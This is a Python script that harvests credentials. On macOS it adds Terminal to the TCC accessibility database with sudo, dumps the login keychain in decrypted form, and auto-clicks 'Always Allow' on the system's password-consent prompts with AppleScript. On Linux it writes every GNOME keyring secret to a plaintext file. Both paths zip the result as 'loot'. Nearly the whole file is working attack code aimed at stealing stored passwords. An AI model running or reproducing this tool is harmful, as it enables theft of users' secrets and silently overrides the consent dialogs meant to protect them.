#!/env/usr/bin python
from os import popen, system, fork, remove
from datetime import datetime
from sys import path
from zipfile import ZipFile
import platform
if platform.system() == "Darwin":
    path.append("/System/Library/Frameworks/Python.framework/Versions/2.7/Extras/lib/python/PyObjC")
    from Foundation import NSAppleScript
if platform.system() == "Linux":
    import pygtk
    pygtk.require('2.0')
    import gnomekeyring
    # the signal handler is needed because of
    # http://stackoverflow.com/questions/16410852/keyboard-interrupt-with-with-python-gtk
    # https://bugzilla.gnome.org/show_bug.cgi?id=622084
    import signal


class KeychainDump:
    """
    This class does what it says --- dumps the keychain. Not supported on 10.12+ (Sierra).
    """
    def getOSVersion(self):
        version = popen("sw_vers -productVersion").read().strip()
	return version

    def addTerminalAccessibility(self):
        """
        Adds the Terminal.app to Accessibility Settings. User password is required.
        """
	version = self.getOSVersion()

        if "10.11" in version:
            status = system("sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \"REPLACE INTO access values ('kTCCServiceAccessibility', 'com.apple.Terminal', 0, 1, 1, NULL, NULL);\"")
        elif ("10.10" in version) or ("10.9" in version):
            status = system("sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \"REPLACE INTO access values ('kTCCServiceAccessibility', 'com.apple.Terminal', 0, 1, 1, NULL);\"")
        else:
            print("Unsupported OS. Can't add Terminal.app to 'Assistive Access Apps'.")
            print("Attempting to dump Keychain --- maybe we'll get lucky.")

    def getLoot(self):
        version = self.getOSVersion()
        dumpCmd = "security dump-keychain -d login.keychain > k.txt"
        zipDump = "zip k.zip k.txt; rm k.txt"
        if "10.9" in version:
            clickAllow = """
        tell application \"System Events\"
        repeat while exists (processes where name is \"SecurityAgent\")
            tell process \"SecurityAgent\"
            click button "Always Allow" of group 1 of window 1
            end tell
            delay 0.2
        end repeat
        end tell
        """
        else:
            clickAllow = """
        tell application \"System Events\"
        repeat while exists (processes where name is \"SecurityAgent\")
            tell process \"SecurityAgent\"
            click button "Always Allow" of window 1
            end tell
            delay 0.2
        end repeat
        end tell
        """

        pid = fork()

        if pid > 0:
            script = NSAppleScript.alloc().initWithSource_(clickAllow)
            execute = script.executeAndReturnError_(None)
        else:
            dump = system(dumpCmd)
            if dump == 0:
                system(zipDump)


class KeyringDump:

    def zipLoot(self):
	zLoot = ZipFile('k.zip', mode='w')
	zLoot.write("k.txt")
	zLoot.close()
        remove("k.txt")
	
 
    def getLoot(self):
	# Shamelessly modified from https://github.com/mnagel/gnome-keyring-dumper
	dumpFile = open("k.txt","w+")

	for keyring in gnomekeyring.list_keyring_names_sync():
	    for id in gnomekeyring.list_item_ids_sync(keyring):
		item = gnomekeyring.item_get_info_sync(keyring, id)
		attr = gnomekeyring.item_get_attributes_sync(keyring, id)
		if attr and attr.has_key('username_value'):
		    dumpFile.write('[%s] %s: %s = %s\n' % (
			keyring,
			item.get_display_name(),
			attr['username_value'],
			item.get_secret()
		    ))
		else:
		    dumpFile.write('[%s] %s = %s\n' % (
			keyring,
			item.get_display_name(),
			item.get_secret()
		))
	    else:
		if len(gnomekeyring.list_item_ids_sync(keyring)) == 0:
		    dumpFile.write('[%s] --empty--\n' % keyring)
	dumpFile.close()


def main():
    os = platform.system()

    if os == "Darwin":
        dump = KeychainDump()
        dump.addTerminalAccessibility()
        dump.getLoot()

    elif os == "Linux":
	signal.signal(signal.SIGINT, signal.SIG_DFL)
	dump = KeyringDump()
	dump.getLoot()
	dump.zipLoot()


if __name__ == "__main__":
    main()

